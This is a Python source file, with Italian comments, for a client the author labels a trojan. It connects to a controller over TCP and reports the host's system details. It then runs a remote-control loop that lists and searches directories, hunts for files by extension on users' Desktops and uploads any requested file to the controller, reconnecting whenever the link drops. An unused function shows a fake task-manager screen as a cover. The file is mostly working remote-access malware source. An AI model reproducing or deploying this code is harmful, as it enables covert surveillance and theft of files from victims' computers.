import os
import pickle
import sys
from socket import *
import platform
import psutil
import time
import signal
from os import system
import traceback

IP = "localhost"
PORT = 12806  # Porta di Ascolto del TCP
ADDR = (IP, PORT)
SIZE = 4096
FORMAT = "utf-8"
FORMATWIN = "windows-1252"
FORMATPDF = "latin-1"


# OK funzione di pulizia schermo per unix e windows
def clearScreen():
    if platform.system() == "Windows":
        system("cls")
    else:
        system("clear")


# OK gestisce il ctrl-C per l'uscita
def signalHandler(signum, frame):
    msg = "Uscita effettuata con successo"
    print(":", msg, end="", flush=True)
    exit(1)


# OK comportamento da trojan
def trojanBehaviour():
    while True:
        try:
            cpu = psutil.cpu_percent()
            ram = psutil.virtual_memory().percent
            disk = psutil.disk_usage("/").percent
            processes_count = 0
            print("\n\b\b\bRESOURCE MANAGEMENT SYSTEM\n")
            print("              --     Task manager: Current state of usage      --\n\n")
            # facciamo un display a video dell'utilizzo
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("             | {:02}%       | {:02}%       | {:02}%        | {:03}               |".format(int(cpu),
                                                                                                              int(ram),
                                                                                                              int(disk),
                                                                                                              processes_count))
            print("              --------------------------------------------------------- ")
            time.sleep(1)
            clearScreen()
        except:
            print("              --------------------------------------------------------- ")
            print("             | CPU USAGE | RAM USAGE | DISK USAGE | RUNNING PROCESSES |")
            print("              --------------------------------------------------------- ")


# OK creazione connessione
def clientConnection():
    try:
        client = socket(AF_INET, SOCK_STREAM)
        client.connect(ADDR)
        print(f"Connessione avvenuta")
        time.sleep(10)
        return client
    except:
        print(f"\nConnessione non riuscita: riprovo tra 10 secondi...")
        return "errore"


# OK manda le informazioni base
def sendInfo(client):
    mando = 1
    while mando == 1:
        try:
            infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd()
            client.send((str((len(infos)))).encode(FORMAT))
            time.sleep(5)
            client.send(((infos)).encode(FORMAT))
            mando = 0
        except:
            traceback.print_exc()
            client.send(("[ERROR] Dati non mandati correttamente, riprovare? Y/N ").encode(FORMAT))
            risposta = client.recv(1024).decode(FORMAT)
            if risposta == "Y" or risposta == "y":
                mando = 1
            elif risposta == "N" or risposta == "n":
                mando = 0


def filespath(tipologia, client):

    result = ["Lista dei risultati per estensione " + tipologia + "\n\n"]

    if platform.system() == "Darwin":
        print("sistema riconosciuto")
        print("tipologia: "+tipologia)
        for cartella, sottocartelle, file in os.walk(r"/Users/erasmo/Desktop"):
            for item in file:
                if item.endswith(tipologia):
                    print("ho trovato il file: "+item)
                    result.append('"' + item + '"' + " nel percorso: " + os.path.dirname(item) + "\n")

    elif platform.system() == "Windows":
        for cartella, sottocartelle, file in os.walk(r"C:\Users\*\Desktop"):
            for item in file:
                if item.endswith(tipologia):
                    result.append('"' + item + '"' + " nel percorso: " + os.path.dirname(os.path.realpath(item)) + "\n")

    elif platform.system() == "Linux":
        for cartella, sottocartelle, file in os.walk(r"/mnt/"):
            for item in file:
                if item.endswith(tipologia):
                    result.append('"' + item + '"' + " nel percorso: " + os.path.dirname(os.path.realpath(item)) + "\n")

    result = ''.join(result)

    try:
        filesize = sys.getsizeof(result)
        client.send((str(filesize)).encode(FORMAT))
        time.sleep(3)
        client.send((result).encode(FORMAT))

    except:
        traceback.print_exc()
        client.send(("Download fallito").encode(FORMAT))


def find(comando, client):
    comandorisolto = comando.split()
    path = comandorisolto[2]
    estensione = comandorisolto[1]
    genericlist = os.listdir(path)
    specificlist = []
    for item in genericlist:
        if item.endswith(estensione):
            specificlist.append(item)
    data = pickle.dumps(specificlist)
    client.send(data)


def openRemoteControl(client):
    comando = "null"
    while comando != "exit":
        try:
            client.send((os.getcwd()).encode(FORMAT))
            comando = client.recv(1024).decode(FORMAT)
            time.sleep(2)
            if comando[0:8] == "download":
                try:
                    filename = comando[10:len(comando) - 1]
                    filesize = os.path.getsize(filename)

                    numeroByteLetti = 0
                    with open(filename, 'rb') as f:
                        line = f.read(filesize)
                        client.send((str(filesize)).encode(FORMAT))
                        time.sleep(3)
                        client.send(line)
                        # Keep sending data to the client
                        # while (line):
                        # client.send(line)
                        # line = f.read(1024)
                        f.close()
                except:
                    client.send(("Download fallito").encode(FORMAT))

            elif comando[0:5] == "cd ..":
                os.chdir("..")
            elif comando[0:2] == "cd":
                path = comando[3:]
                os.chdir(os.getcwd() + "/" + path)
            elif comando[0:2] == "ls":
                if len(comando) == 2:
                    # ritorna una lista
                    listdir = os.listdir()
                    # faccio un dump per poterla inoltrare
                    data = pickle.dumps(listdir)
                    client.send(data)
                    time.sleep(1.5)
                else:
                    comandorisolto = comando.split()
                    path = comandorisolto[1]
                    listdir = os.listdir(path)
                    data = pickle.dumps(listdir)
                    client.send(data)
                    time.sleep(1.5)
            elif comando == "pwd":
                client.send((os.getcwd()).encode(FORMAT))
                time.sleep(1.5)
            elif comando[0:9] == "filespath":
                estensione = comando[10:]
                filespath(estensione, client)
                time.sleep(1.5)
            elif comando[0:4] == "find":
                find(comando, client)
                time.sleep(1.5)
            elif comando[0:4] == "info":
                infos = "Operating System: " + platform.system() + "\nMachine: " + platform.machine() + "\nHost: " + platform.node() + "\nProcessor: " + platform.processor() + "\nPlatform: " + platform.platform() + "\nRelease: " + platform.release() + "\nPath: " + os.getcwd() + "\n"
                client.send(((infos)).encode(FORMAT))
                time.sleep(1.5)
            # else comandi già interpretati dal sistema (controllo diretto sul terminale)
        except:
            traceback.print_exc()
            print("Command " + comando + " not found ...\n")
            comando = "null"

    print("Procedura di controllo remoto conclusa con successo")


def main():
    signal.signal(signal.SIGINT, signalHandler)
    client = clientConnection()
    client.setblocking(True)

    if client == "errore":
        raise Exception
    else:
        print("Invio informazioni sul mio sistema al server")

        sendInfo(client)
        time.sleep(5)

        try:
            openRemoteControl(client)
            time.sleep(5)
        except:
            raise Exception

        client.setblocking(False)
        client.send(1024)
        client.close()


# start trojan
# thread_trojan=Thread(target=trojanBehaviour)
# thread_trojan.start()
# thead_remoteControl=Thread(target=remoteControl)


if __name__ == "__main__":

    while True:
        try:
            main()
        except:
            # traceback.print_exc()
            print("Mi sto riconnetendo")
            t_end = time.time() + 10
            while time.time() < t_end:
                clearScreen()
                print(".", end="")
                time.sleep(1)
                print(".", end="")
                time.sleep(1)
                print(".")
                time.sleep(1)
                clearScreen()
